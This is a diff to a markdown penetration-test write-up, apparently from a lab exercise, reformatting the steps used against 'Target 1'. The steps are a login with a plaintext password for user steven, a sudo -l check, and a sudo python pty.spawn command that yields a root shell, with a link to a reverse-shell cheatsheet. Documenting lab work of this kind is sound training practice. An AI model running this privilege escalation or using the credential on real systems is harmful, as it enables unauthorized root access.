@@ -113,13 +113,10 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
    - logged into steven with password pink367 
   
    - ran sudo -l to see stevens permissions
-   
-   
-    
-    - We can run python as sudo so we can create shell as root with python
-    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell
-    -sudo python -c 'import pty; pty.spawn("/bin/sh")'
-    - screen shot 
+   - We can run python as sudo so we can create shell as root with python
+   - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell
+   - sudo python -c 'import pty; pty.spawn("/bin/sh")'
+   - screen shot
      
      
     ## Target 2
